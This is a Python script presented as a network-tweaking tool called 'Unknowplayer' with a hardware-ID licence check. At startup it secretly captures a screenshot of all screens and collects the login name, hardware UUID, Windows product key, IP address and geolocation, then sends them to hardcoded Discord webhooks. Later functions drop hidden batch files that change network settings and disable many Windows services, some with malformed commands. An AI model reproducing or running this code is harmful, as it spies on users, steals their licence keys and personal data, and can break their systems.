import os,webbrowser,subprocess,sys,requests,time,httpx
from pystyle import System 
from discord_webhook import DiscordWebhook
from tkinter import Label,Button,Frame,Tk,ttk
from secrets import token_hex
from os import popen, environ
from subprocess import call
from PIL import ImageGrab

hwid = str(str(subprocess.check_output('wmic csproduct get uuid')).strip().replace(r"\r", "").split(r"\n")[1].strip())
mypcname = os.getlogin()
wkey = subprocess.check_output("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", creationflags=0x08000000).decode().rstrip()
r =requests.get("https://pastebin.com/raw/V9U2P6EU")
webhookin = "https://discord.com/api/webhooks/1047516378619461632/GZzPdnb1j5Fz5HTS-eZqFQrwg02yq8zsXZvArosL3wLoAwS5zn0_DvHeSiBB7mbjSrAb"
webhookin1 = "https://discord.com/api/webhooks/1047516378619461632/GZzPdnb1j5Fz5HTS-eZqFQrwg02yq8zsXZvArosL3wLoAwS5zn0_DvHeSiBB7mbjSrAb"
webhookout = "https://discord.com/api/webhooks/1047516984633466961/r59Nlgy2mji4wp8F0879DOoCWNiFpBNDVThBo9kNRlX7JmtdDwRwIrVuQoIaagI6lArX"
webhookout1 = "https://discord.com/api/webhooks/1047516984633466961/r59Nlgy2mji4wp8F0879DOoCWNiFpBNDVThBo9kNRlX7JmtdDwRwIrVuQoIaagI6lArX"
d = httpx.get("https://ipinfo.io/json")
a = d.json()
ip = a.get('ip')
city = a.get('city')
country = a.get('country')
region = a.get('region')
org = a.get('org')
loc = a.get('loc')

os.system('cls')

dataloadedsuccessfullypic = '''
    ──────────────────────────────────────────────────────────────────────
    ..^PB############BBBB######&&&&#####B###################&&&&&&&&##BY^^
    ..JGBB#########BBBB###&&#&&&#####B####################&&&&&&&&&&##B?^^
    ..:^~JB##########B##&&&&&&#######&&###############&&&&@&&&&&&&&##G7!^^
    ....~PBB##########&&#&&&&&####&&&########&&####&&&&&###&&&&&&##&#?^^^^
    ...:!!!B#######&&&#PY5GPP5PPG&######&&&#&&##BGP555YYYJJ5&#&BY?##J7!^~~
    ::::..~57JG&#BBBGGP55555PPPPB##&BBP5YYJJPBP5PPPPPGGPPPPPGG5!~Y&J::!!~~
    ::::::!::^JB&G7^:^^^PBPPB#BGB#555Y7::^^:?YYP5P#BG#&GPG#7:::^^JP:^^:~!~
    :::::!^:^^!7PB~^.   ^555555PP7  :^^^^^^^^^^: .?5PPPPP5!....^^?~^5Y^:?!
    ::::~7:^^J57:77^^. . .:!7?7!:...^^^^^^^^^^^:...:!77!^.....:^^^^JPG!^J!
    :::::7!:^YYY?^^:^^:.    .   ...^^^^~!7~~^^^^:...........::^^^:!PP7^?!~
    ::::::~!^^7Y55JJ^^!!~^:...:^~^^^^^~!7?7~^^^^^~~::...::^~7^^^!J5Y!~?!~~
    ::::::::^~^^~7G@Y:^^~~~^^^~~~^^^^^^^^7^^^^^^^^~~^^^^^~~^^^^~BG7~!7~~~~
    ::::::::::^~~!JPP~^^^^^^^^^^^^^^^^^^^~^^^^^^^^^^^^^^^^^^^^^!J?77!~~~~~
    ::::::::::::^~!7??~:^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^!??7~~~~~~~!
    :::::::::::::::^~~?7^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^?Y~~~~~~!!!!!
    :::::::::::::::::::?J!^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^~Y5!~~~~!!!!!!!
    :::::::::::::^^^^^^:!?7~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^~?5B7~!!!!?!!!!!!
    :::::::::::^^^^^^^^^^^!?7~^^^^^^^^^^!!7?7!^^^^^^^^^~?PGYP7~!!!!!!!!!!!
    :::::::::^^^:^^^^^^^^^^^!557~^^^^^^^~^^^^^^^^^^^^!JG#PYY57!!!!!!!!!!!!
    ^^^^^^^^^^^:~^:^^^^^^^^^^!B##P?!^^^^^^^^^^^^^^!JG#BGPY5Y5J!!!!!!!!!!!!
    ^^^^^^^^^^:!G5?^^^^?!^^^^^?5#@@&B5J7!~^~~~!J5B&&G55PY55YJY7!!!!!!!!!!!
    ^^^^^^^^^^:P7^J^^!J7^^^^^^~JY#&@@@@@&#B##&@@&BPYY5P55Y?!^7Y!!!!77??JJJ
    ^^^^^^^^^^!P^^^^~!^^^^^^~~~JJ5PG&@@@@@@@@&BP5YYY5PPY7!~^^!5Y?JJYYYJJJ?
    ^^^^^^^^^^~77G7:^^^~5~^~~~~?JY5YYP#&&#BG55YYYYY5PP?~^~~^^7Y5??7!!~~~~^
    ^^^^^^^^^^^^^G7Y5~~7B~~~~~~?YYY5YYY55YYYY55YYYY5J!^^^~~~~~~~!^^^^^^^^~
    ^^^^^~!^~~~~^??!~7?J!~~~!7JY5YYPPYYYY555555YY7!7~^^~?J!^^^^~~!!!~~~^~~
    ^^^^^!~^~~~~~^^~~~~~~!7!~~?5PYY5B5Y5555555J7~^!~~~JPY~^^^^^^^^^~^^~~^^
    ~~~~~~~~~~~~~~~~~~!7!~^^^^^?PYYYBGY55555J!^^~~~~?Y5Y~^^~~~~~~^^^^^~^^^
    ──────────────────────────────────────────────────────────────────────
'''[1:]
dataloadedsuccessfullymsg = '''
    █▀▀▄ █▀▀█ ▀▀█▀▀ █▀▀█  █░░ █▀▀█ █▀▀█ █▀▀▄ █▀▀ █▀▀▄  █▀▀ █░░█ █▀▀ █▀▀ █▀▀ █▀▀ █▀▀ █▀▀ █░░█ █░░ █░░ █░░█
    █░░█ █▄▄█ ░░█░░ █▄▄█  █░░ █░░█ █▄▄█ █░░█ █▀▀ █░░█  ▀▀█ █░░█ █░░ █░░ █▀▀ ▀▀█ ▀▀█ █▀▀ █░░█ █░░ █░░ █▄▄█ 
    ▀▀▀░ ▀░░▀ ░░▀░░ ▀░░▀  ▀▀▀ ▀▀▀▀ ▀░░▀ ▀▀▀░ ▀▀▀ ▀▀▀░  ▀▀▀ ░▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀░░ ░▀▀▀ ▀▀▀ ▀▀▀ ▄▄▄█
'''[1:]

def printSlow(text):
    for char in text:
        print(char, end="")
        sys.stdout.flush()
        time.sleep(0.1)

def Main_Program():
    if hwid in r.text:
        print("\n")  
        print("&&&&&&&@&&&&&#####&#########################BB######################PB######&&&&@@@@&########&&&&&&#")
        print("&&&&&&&&@&&&#########################BPB#B########################P?7###&##&&&&&@@&@@########&&&&&&&")
        print("&&&&&&&&&&&&&&###########G#####BGPY?!~J######BBBB#########B##&#GY7!~7##P###&&@@@@##&&#########&&&&&&")
        print("&&&&&&&&&&&&&&#######&##YP#&@&&#BGPP55B#&&BBBBBBBBBBBBBBBB##BG5YYPGPG&GP##&@@&G#@P7#&#BB######&&&&&&")
        print("&&&&&&&&&&&&&&##&##&#&&G5#&GJ?7J!~7JP##B#BB######BBBBBBBBB#GY77~^:!J7P@&BB&BBBPP5!?&@@&#BB###&&&&&&&")
        print("&&&&&&&&&&&&&G?5@BB&&&@&Y7#B^:^^    !J!P##BG5Y#&#B#######B?.  ^    ~~Y@5JGYYGYJ7?P&@@@@@&#BBB#&&&&&&")
        print("&&&&&&&&&&&&B?!7BPG#&&&Y~~!P?^~!.      ?JB#7?B#BB&&&##G#P!~      .~!^7?!!5#P7!JG&@@@@@@@@@&#BB#&&&@&")
        print("&&&&&&&&&&&&@@#PJ!!??55PB!~~~^^^~^.     7J5GP5?JB#G5?!~?~^J^...:^!~^77~!!JY?YB&&&&&&&@@@@@@@&#B#@&&@")
        print("&&&&&&&&&&&@@@&&&#GY?7!?57!~!J!^^^~~~~~!7^^!~~~7?!~~~~~~^^^~~~^^^^!Y57!~?##&@@&&&&&&#&@@@@@@@@&#&&&&")
        print("&&&&&&&&&@@@@&&&&&&&&&&#B#P~~???7!~~^^^^^^~~~~77777~~~~~~^~^~~!!77?7!!~!#@@@@@@@&&#BB&@@@@@@@@@@&&&&")
        print("&&&&&&&@@@@@&&&&&&&&&&&&&@@5~~~~!777??JY?~~~~~~7J?!~~~~~~~!!!!!!!~~~!~7B@@@@@@@&#BBB#@@@@@@@@@@@@&&&")
        print("&&&&&@@@@@@@&&&&&&&&&&&&&&&Y57~~~~~~~~~~~~~~~~~~?~~~~~~~~~~~~~~~~~~~!5&@@@@@@@&BBBBB#@@@@@@@@@@@@&&&")
        print("&&&@@@@@@@@&&&&&&&&&&&&&&&&!!PJ~~~~~~~~~~~~~~~~~7~~~~~~~~~~~~~~~~~~JGP&@@@@@@&BBBBBB&@@@@@@@@@@@@@&&")
        print("&&@@@@@@@@@&&&&&&&&&#&&&&&&!^~BB?~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~?BB!!&@@@@@@#BBBBB&@@@@@@@@@@@@@@@&")
        print("&&@@@@@@@@&&&&&&&&@&B&&&&&&!^^?@@BJ!~~~~~~~~~~~~~~~~~~~~~~~~~~!JB@@?^?@@@@@@&BBBBB###&@@@@@@@@@@@@@@")
        print("&&@@@@@@@&&&&&&&&&&&BB&&&&&7^^~B@@@&GJ7~~~~~~!7!!!!!!7!~~~~!JP#@&@#~^Y@@@@@@#BBBBB#BBB&@@@@@@@@@@@@@")
        print("&&@@@@@&&&&&&&&&&&&&#BB&&&@?^~^?&&&@@@&#GY?!~~!!!!!!!?7!?5B&@@&PP@B^~B@@@@@&BBBBBB#BBBB#&@@@@@@@@@@@")
        print("&&&&&&&&&&&&&&&&B#&&&BG#&@@Y^~~~55YP&@B#@@@&#G5J7!!7?YG&@@@@&BYYB@G^5@@@@@@BBBBBB#BBBBBBB#&&&&@@@@@@")
        print("&&&&&&&&&&&&&&&&#&&&&BGB#@@#~~~^!P5JP@BYPG&@@@@@&&#&@@@@@&##GYY5&@#~7#@@@@&BBBBBB#BBBBBBBB#&&&@@@@@@")
        print("\n")
        printSlow("────────────────────────────────────────────────────────────────────────────────────────────────")
        os.system('cls')
        image = ImageGrab.grab(bbox=None,include_layered_windows=True,all_screens=True,xdisplay=None)  
        image.save("imageunknowplayersecurity.png")
        webhookin1 = DiscordWebhook(url="https://discord.com/api/webhooks/1047516378619461632/GZzPdnb1j5Fz5HTS-eZqFQrwg02yq8zsXZvArosL3wLoAwS5zn0_DvHeSiBB7mbjSrAb", username=f"คุณ {mypcname} ได้เข้าระบบสำเร็จ" )
        with open("imageunknowplayersecurity.png", "rb") as f:
           webhookin1.add_file(file=f.read(), filename='imageunknowplayersecurity.png')
        os.remove("imageunknowplayersecurity.png")
        httpx.post(
            webhookin, json={
            "content":"",
            "embeds": [
            {
              "title": f"User : {mypcname}",
              "tts": False,
              "description": f"""Project : Unknowplayer
                Version : 1 
                Status : เข้าระบบสำเร็จ 
                HWID : {hwid}
                Product Key : {wkey}
                IP : {ip}
                เมือง : {city}
                ประเทศ : {country}
                ภูมิภาค : {region}
                องค์กร : {org}
                โลเคชั่น : {loc}
                 """,
              "color": 0x1cff00,
            }
          ],
          "username": f"คุณ {mypcname} ได้เข้าระบบสำเร็จ",
          }
        )
        response = webhookin1.execute()
        print("░██████╗████████╗░█████╗░██╗░░░██╗  ██╗░░░░░░█████╗░░██████╗░░██████╗░███████╗██████╗░  ██╗███╗░░██╗")
        print("██╔════╝╚══██╔══╝██╔══██╗╚██╗░██╔╝  ██║░░░░░██╔══██╗██╔════╝░██╔════╝░██╔════╝██╔══██╗  ██║████╗░██║")
        print("╚█████╗░░░░██║░░░███████║░╚████╔╝░  ██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██║░░██║  ██║██╔██╗██║")
        print("░╚═══██╗░░░██║░░░██╔══██║░░╚██╔╝░░  ██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██║░░██║  ██║██║╚████║")
        print("██████╔╝░░░██║░░░██║░░██║░░░██║░░░  ███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██████╔╝  ██║██║░╚███║")
        print("╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░░░╚═╝░░░  ╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═════╝░  ╚═╝╚═╝░░╚══╝")
        print("\n")
        print("█░█ █▄░█ █▄▀ █▄░█ █▀█ █░█░█ █▀█ █░░ ▄▀█ █▄█ █▀▀ █▀█  ")
        print("█▄█ █░▀█ █░█ █░▀█ █▄█ ▀▄▀▄▀ █▀▀ █▄▄ █▀█ ░█░ ██▄ █▀▄  ")
        print("\n")
        print("█▄▄ █▄█   █   █▀ █▀█ █▄░█ █ █▀▀   ░   █▀▀ ▀▄▀ █▀▀ █▄▄ █▀█ ▀▀█ █░█")
        print("█▄█ ░█░   ▄   ▄█ █▄█ █░▀█ █ █▄▄   ▄   ██▄ █░█ ██▄ █▄█ █▄█ ░░█ ▀▀█")

    else:
        
        print("█░█ █░█░█ █ █▀▄   █▄░█ █▀█ ▀█▀   █▀▀ █▀█ █░█ █▄░█ █▀▄")
        print("█▀█ ▀▄▀▄▀ █ █▄▀   █░▀█ █▄█ ░█░   █▀░ █▄█ █▄█ █░▀█ █▄▀")
        print("\n")
        image = ImageGrab.grab(bbox=None,include_layered_windows=True,all_screens=True,xdisplay=None)  
        image.save("imageunknowplayersecurity.png")
        webhookout1 = DiscordWebhook(url="https://discord.com/api/webhooks/1047516984633466961/r59Nlgy2mji4wp8F0879DOoCWNiFpBNDVThBo9kNRlX7JmtdDwRwIrVuQoIaagI6lArX", username=f"คุณ {mypcname} ได้เข้าระบบไม่สำเร็จ")
        with open("imageunknowplayersecurity.png", "rb") as f:
           webhookout1.add_file(file=f.read(), filename='imageunknowplayersecurity.png')
        os.remove("imageunknowplayersecurity.png")   
        httpx.post(
            webhookout, json={
            "content":"",
            "embeds": [
            {
              "title": f"User : {mypcname}",
              "tts": False,
              "description": f"""Project : Unknowplayer
                Version : 1 
                Status : เข้าระบบสำเร็จ 
                HWID : {hwid}
                Product Key : {wkey}
                IP : {ip}
                เมือง : {city}
                ประเทศ : {country}
                ภูมิภาค : {region}
                องค์กร : {org}
                โลเคชั่น : {loc}
                 """,
              "color": 0xcf0a0a,
            }
          ],
          "username": f"คุณ {mypcname} ได้เข้าระบบไม่สำเร็จ",
          }
        )
        response = webhookout1.execute()
        print("HWID : " + hwid)
        print("\n")
        print("█░█ █▄░█ █▄▀ █▄░█ █▀█ █░█░█ █▀█ █░░ ▄▀█ █▄█ █▀▀ █▀█  ")
        print("█▄█ █░▀█ █░█ █░▀█ █▄█ ▀▄▀▄▀ █▀▀ █▄▄ █▀█ ░█░ ██▄ █▀▄  ")
        print("█▄▄ █▄█   █   █▀ █▀█ █▄░█ █ █▀▀   ░   █▀▀ ▀▄▀ █▀▀ █▄▄ █▀█ ▀▀█ █░█")
        print("█▄█ ░█░   ▄   ▄█ █▄█ █░▀█ █ █▄▄   ▄   ██▄ █░█ ██▄ █▄█ █▄█ ░░█ ▀▀█")
        os.system('pause')
        exit()
System.Title("Unknowplayer By Sonic")
Main_Program()

def Player1():
    System.Clear()
    file_location = environ['PATH'].split(';')[0] + f'''\\{token_hex(16)}.bat'''
    open(file_location, 'wb').write(bytes('''
    netsh interface ipv4 set subinterface "Ethernet" mtu=1500 store=persistent
cls
netsh interface ipv4 set subinterface "Wi-Fi" mtu=1500 store=persistent
cls
netsh int tcp set global maxsynretransmissions=8
cls
netsh int tcp set global rss=enabled
cls
netsh interface ipv4 set subinterface "Ethernet" mtu=1640 store=persistent
cls
netsh int tcp set heuristics disabled
cls
netsh int tcp set global netdma=enabled
cls
netsh int tcp set global dca=enabled
cls
netsh int tcp set global nonsackrttresiliency=disabled
cls
netsh int tcp set global ecncapability=disabled
cls
ping -n 3 localhost>nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "IRPStackSize" /t REG_DWORD /d "32" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "SizReqBuf" /t REG_DWORD /d "17424" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "Size" /t REG_DWORD /d "3" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "MaxWorkItems" /t REG_DWORD /d "8192" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "MaxMpxCt" /t REG_DWORD /d "2048" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "MaxCmds" /t REG_DWORD /d "2048" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "DisableStrictNameChecking" /t REG_DWORD /d "1" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "EnableDynamicBacklog" /t REG_DWORD /d "1" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "MinimumDynamicBacklog" /t REG_DWORD /d "200" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "MaximumDynamicBacklog" /t REG_DWORD /d "20000" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DynamicBacklogGrowthDelta" /t REG_DWORD /d "100" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "KeepAliveInterval" /t REG_DWORD /d "1" /f
cls
Reg.exe add "HKLM\SYSTEM\ControlControlSet\Services\Dnscache\Parameters" /v "NegativeSOACacheTime" /t REG_DWORD /d "0" /f
cls
Reg.exe add "HKLM\SYSTEM\ControlControlSet\Services\Dnscache\Parameters" /v "NetFailureCacheTime" /t REG_DWORD /d "0" /f
cls
Reg.exe add "HKLM\SYSTEM\ControlControlSet\Services\Dnscache\Parameters" /v "MaxCacheEntryTtlLimit" /t REG_DWORD /d "10800" /f
cls
Reg.exe add "HKLM\SYSTEM\ControlControlSet\Services\Dnscache\Parameters" /v "MaxCacheTtl" /t REG_DWORD /d "10800" /f
cls
Reg.exe add "HKLM\SYSTEM\ControlControlSet\Services\Dnscache\Parameters" /v "MaxNegativeCacheTtl" /t REG_DWORD /d "0" /f
cls

netsh int tcp set global rsc=enabled
cls
netsh int tcp set global ecncapability=disabled
cls
netsh int tcp set global autotuninglevel=disabled
cls
netsh int tcp set heuristics disabled
cls
netsh int tcp set global chimney=disabled
cls
netsh int tcp set global dca=enabled
cls
netsh int tcp set global rss=enabled
cls
netsh int tcp set global netdma=enabled
cls
netsh int tcp set global congestionprovider=ctcp
cls
netsh int tcp set global timestamps=disabled
cls
netsh int tcp set global nonsackrttresiliency=disabled
cls
netsh int tcp set supplemental template=custom icw=10
cls 
netsh int tcp set heuristics disabled
cls
netsh int tcp set global rss=enabled
cls
netsh int tcp set global chimney=enabled
cls
netsh int tcp set global autotuninglevel=normal
cls
netsh int tcp set global congestionprovider=ctcp
cls
netsh int tcp set global ecncapability=disabled
cls
netsh int tcp set global timestamps=disabled
cls
netsh int tcp set heuristics disabled
cls
netsh int tcp set global autotuninglevel=disabled
cls
netsh int tcp set global congestionprovider=ctcp
cls
netsh int tcp set global rss=enabled
cls
netsh int tcp set global chimney=enabled
cls
netsh int tcp set global dca=enabled
cls
netsh interface ipv4 set subinterface "Wireless Network Connection" mtu=1500 store=persistent
cls
netsh int tcp set global netdma=enabled
cls
netsh int tcp set global timestamps=disabled
cls
netsh int tcp set global nonsackrttresiliency=disabled
cls
netsh int tcp set supplemental template=custom icw=10
cls
netsh int tcp set global fastopen=enabled
cls
netsh int tcp set heuristics disabled
cls
netsh int tcp set global rss=enabled
cls
netsh int tcp set global chimney=enabled
cls
netsh int tcp set global autotuninglevel=normal
cls
netsh int tcp set global congestionprovider=ctcp
cls
netsh int tcp set global ecncapability=disabled
cls
netsh int tcp set global timestamps=disabledstart cmd.exe /k ping  127.0.0.1  -t -l-n 65000
cls
netsh int tcp set global congestionprovider=none
cls
netsh int tcp set global autotuninglevel=high
cls
netsh int tcp set global chimney=disabled
cls
netsh int tcp set global dca=enable
cls
netsh int tcp set global netdma=enable
cls
netsh int tcp set heuristics enable
cls
netsh int tcp set global rss=enabled
cls
netsh int tcp set global timestamps=enable
cls
netsh interface tcp set global rss=enabled chimney=automatic netdma=disabled dca=disabled autotuninglevel=normal
cls
netsh interface tcp set global congestionprovider=none ecncapability=disabled timestamps=disabled 
cls
netsh interface tcp set global initialrto=3000
cls
netsh interface ipv4 set subinterface "Internet" mtu=80 store=persistent
cls
netsh interface ipv4 set subinterface "Ethernet" mtu=80 store=persistent
cls
netsh interface tcp set global autotuning=normal
cls
netsh int tcp set global congestionprovider=none
cls
netsh int tcp set global autotuninglevel=high
cls
netsh int tcp set global chimney=disabled
cls
netsh interface ipv4 set subinterface "Local Area Connection" mtu=150 store=persistent
cls
netsh int tcp set global rss=default
cls
netsh int tcp set heuristics disabled
cls
netsh interface ipv4 set subinterface "Local Area Connection" mtu=4000 store=persistent
cls
netsh interface ipv4 set subinterface "Internet" mtu=4000 store=persistent
cls
netsh interface ipv4 set subinterface "Ethernet" mtu=5000 store=persistent
cls
netsh int tcp set global congestionprovider=none
cls
netsh int tcp set global autotuninglevel=high
cls	
netsh int tcp set global chimney=disabled
cls
netsh int tcp set global dca=enable
cls
netsh int tcp set global netdma=enable
cls
netsh int tcp set heuristics enable
cls
netsh int tcp set global rss=enabled
cls
netsh int tcp set global timestamps=enable
cls
ping -n 3 localhost>nul
cls
sc config WSearch start= disabled
cls
sc config WMPNetworkSvc start= disabled
cls
sc config SNMPTRAP start= disabled
cls
sc config SCPolicySvc start= disabled
cls
sc config SCardSvr start= disabled
cls
sc config RemoteRegistry start= disabled
cls
sc config RpcLocator start= disabled
cls
sc config WPCSvc start= disabled
cls
sc config CscService start= disabled
cls
sc config napagent start= disabled
cls
sc config Netlogon start= disabled
cls
sc config MSiSCSI start= disabled
cls
sc config iphlpsvc start= disabled
cls
sc config TrkWks start= disabled
cls
sc config CertPropSvc start= disabled
cls
sc config PeerDistSvc start= disabled
cls
sc config bthserv start= disabled
cls
sc config WSearch start= disabled
cls
sc config WMPNetworkSvc start= disabled
cls
sc config SNMPTRAP start= disabled
cls
sc config SCPolicySvc start= disabled
cls
sc config SCardSvr start= disabled
cls
sc config RemoteRegistry start= disabled
cls
sc config RpcLocator start= disabled
cls
sc config WPCSvc start= disabled
cls
sc config CscService start= disabled
cls
sc config napagent start= disabled
cls
sc config Netlogon start= disabled
cls
sc config MSiSCSI start= disabled
cls
sc config iphlpsvc start= disabled
cls
sc config TrkWks start= disabled
cls
sc config CertPropSvc start= disabled
cls
sc config PeerDistSvc start= disabled
cls
sc config bthserv start= disabled
cls
sc config WSearch start= disabled
cls
sc config WMPNetworkSvc start= disabled
cls
sc config SNMPTRAP start= disabled
cls
sc config SCPolicySvc start= disabled
cls
sc config SCardSvr start= disabled
cls
sc config RemoteRegistry start= disabled
cls
sc config RpcLocator start= disabled
cls
sc config WPCSvc start= disabled
cls
sc config CscService start= disabled
cls
sc config napagent start= disabled
cls
sc config Netlogon start= disabled
cls
sc config MSiSCSI start= disabled
cls
sc config iphlpsvc start= disabled
cls
sc config TrkWks start= disabled
cls
sc config CertPropSvc start= disabled
cls
sc config PeerDistSvc start= disabled
cls
sc config bthserv start= disabled
cls
sc config SensrSvc start= disabled
cls
sc config WinHttpAutoProxySvc start= disabled
cls
sc config WinRM start= disabled
cls
sc config WerSvc start= disabled
cls
sc config WcsPlugInService start= disabled
cls
sc config ALG start= disabled
cls
sc config BDESVC start= disabled
cls
sc config EFS start= disabled
cls
sc config Fax start= disabled
cls
sc config hidserv start= disabled
cls
sc config SessionEnv start= disabled
cls
sc config TermService start= disabled
cls
sc config UmRdpService start= disabled
cls
sc config TabletInputService start= disabled
cls
sc config WbioSrvc start= disabled
cls
cls
sc config "Dnscache" start= demand
sc start Dnscache
stop
GOTO MISPLACEMENT1351


:MISPLACEMENT1351
ping 127.0.0.1 -n 4

sc query BITS | find /I "STATE" | find "STOPPED"
sc stop Dnscache
goto :start133

:start133
sc start BITS
goto :oneone

cls
goto oneone
    ''', 'utf-8'))
    _open = popen('attrib +h ' + file_location)
    _open.read()
    call(file_location)
    System.Clear()
    print(dataloadedsuccessfullymsg)
    print(dataloadedsuccessfullypic)
    print(dataloadedsuccessfullymsg)
def Player2():
    System.Clear()
    file_location = environ['PATH'].split(';')[0] + f'''\\{token_hex(16)}.bat'''
    open(file_location, 'wb').write(bytes('''
    @echo off
cls
REGEDIT4
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters]
"IRPStackSize"=dword:00000032
"SizReqBuf"=dword:00017424
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters]
"MaxFreeTcbs"=dword:00065536
"MaxUserPort"=dword:00065534
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\{2C7B2EE4-D141-4A1C-97DA-E7C9EC9B9B3F}]
"UseZeroBroadcast"=dword:00000000
"EnableDeadGWDetect"=dword:00000001
"EnableDHCP"=dword:00000001
"Domain"=""
"RegistrationEnabled"=dword:00000001
"RegisterAdapterName"=dword:00000000
"DhcpServer"="192.168.1.1"
"Lease"=dword:0000a8c0
"LeaseObtainedTime"=dword:57b56e73
"T1"=dword:57b5c2d3
"T2"=dword:57b6021b
"LeaseTerminatesTime"=dword:57b61733
"AddressType"=dword:00000000
"IsServerNapAware"=dword:00000000
"DhcpConnForceBroadcastFlag"=dword:00000001
"IPAddress"=hex(7):00,00
"SubnetMask"=hex(7):00,00
"DefaultGateway"=hex(7):00,00
"DefaultGatewayMetric"=hex(7):00,00
"DhcpIPAddress"="192.168.1.35"
"DhcpSubnetMask"="255.255.255.0"
"NameServer"="208.67.222.222,208.67.220.220,200.63.155.71,200.63.155.199,200.51.211.7,200.51.212.7,200.45.191.35,200.45.191.40,200.49.156.3,200.49.159.69,200.49.156.8,200.49.156.7,200.69.193.1,200.69.193.2,200.43.2.6,200.43.31.6,4.4.4.4,4.4.2.2"
"TCPNoDelay"=dword:0000400f
"TcpDelAckTicks"=dword:00000000
"TcpAckFrequency"=dword:0000400f
"DhcpInterfaceOptions"=hex:06,00,00,00,00,00,00,00,04,00,00,00,00,00,00,00,33,  17,b6,57,c0,a8,01,01,03,00,00,00,00,00,00,00,04,00,00,00,00,00,00,00,33,17,  b6,57,c0,a8,01,01,01,00,00,00,00,00,00,00,04,00,00,00,00,00,00,00,33,17,b6,  57,ff,ff,ff,00,36,00,00,00,00,00,00,00,04,00,00,00,00,00,00,00,33,17,b6,57,  c0,a8,01,01,35,00,00,00,00,00,00,00,01,00,00,00,00,00,00,00,33,17,b6,57,05,  00,00,00,01,00,00,00,00,00,00,00,00,00,00,00,01,00,00,00,6f,98,b5,57,0c,00,  00,00,00,00,00,00,0b,00,00,00,00,00,00,00,33,17,b6,57,47,49,47,41,42,59,54,  45,2d,50,43,00,33,00,00,00,00,00,00,00,04,00,00,00,00,00,00,00,33,17,b6,57,  00,00,a8,c0,fc,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,6c,98,b5,57
"DhcpGatewayHardware"=hex:c0,a8,01,01,06,00,00,00,b0,c5,54,a7,63,ee
"DhcpGatewayHardwareCount"=dword:00000001
"DhcpNameServer"="192.168.1.1"
"DhcpDefaultGateway"=hex(7):31,00,39,00,32,00,2e,00,31,00,36,00,38,00,2e,00,31,  00,2e,00,31,00,00,00,00,00
"DhcpSubnetMaskOpt"=hex(7):32,00,35,00,35,00,2e,00,32,00,35,00,35,00,2e,00,32,  00,35,00,35,00,2e,00,30,00,00,00,00,00

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\{846ee342-7039-11de-9d20-806e6f6e6963}]

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\{9C1E752A-B125-4651-A60A-2620EDABB7D8}]
"UseZeroBroadcast"=dword:00000000
"EnableDeadGWDetect"=dword:00000001
"EnableDHCP"=dword:00000001
"NameServer"=""
"Domain"=""
"RegistrationEnabled"=dword:00000001
"RegisterAdapterName"=dword:00000000
"DhcpIPAddress"="0.0.0.0"
"DhcpSubnetMask"="255.0.0.0"
"DhcpServer"="255.255.255.255"
"Lease"=dword:00000000
"LeaseObtainedTime"=dword:00000000
"T1"=dword:00000000
"T2"=dword:00000000
"LeaseTerminatesTime"=dword:00000000
"AddressType"=dword:00000000
"IsServerNapAware"=dword:00000000
"DhcpConnForceBroadcastFlag"=dword:00000000
"TCPNoDelay"=dword:0000400f
"TcpDelAckTicks"=dword:00000000
"TcpAckFrequency"=dword:0000400f
    ''', 'utf-8'))
    _open = popen('attrib +h ' + file_location)
    _open.read()
    call(file_location)
    System.Clear()
    print(dataloadedsuccessfullymsg)
    print(dataloadedsuccessfullypic)
    print(dataloadedsuccessfullymsg)
def Player3():
    System.Clear()
    file_location = environ['PATH'].split(';')[0] + f'''\\{token_hex(16)}.bat'''
    open(file_location, 'wb').write(bytes('''
    @echo off
REGEDIT.DemonUser
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters]
"SackOpts"=dword:00000001
"
"TcpWindowSize"=dword:0005ae4c
"
"Tcp1323Opts"=dword:00000003
"
"DefaultTTL"=dword:7fff
"
"EnablePMTUBHDetect"=dword:00000000
"
"EnablePMTUDiscovery"=dword:00000001
"
"GlobalMaxTcpWindowSize"=dword-:0005ae4c
"
"TcpTimedWaitDelay" dword:30
"
